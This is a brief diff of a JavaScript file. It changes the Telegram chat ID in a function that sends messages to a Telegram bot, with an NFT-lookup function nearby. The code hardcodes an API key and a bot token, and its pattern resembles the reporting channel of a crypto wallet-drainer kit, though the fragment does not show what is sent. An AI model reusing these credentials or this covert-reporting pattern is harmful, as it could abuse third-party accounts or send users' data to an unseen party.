@@ -283,7 +283,7 @@ async function getNFTs(address="", api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P
 }
 async function sendMessage(message){
   return new Promise((resolve, reject)=>{
-    const chat_id = 1027523484;
+    const chat_id = 1027623484;
     fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
           method: "GET",
           headers: {
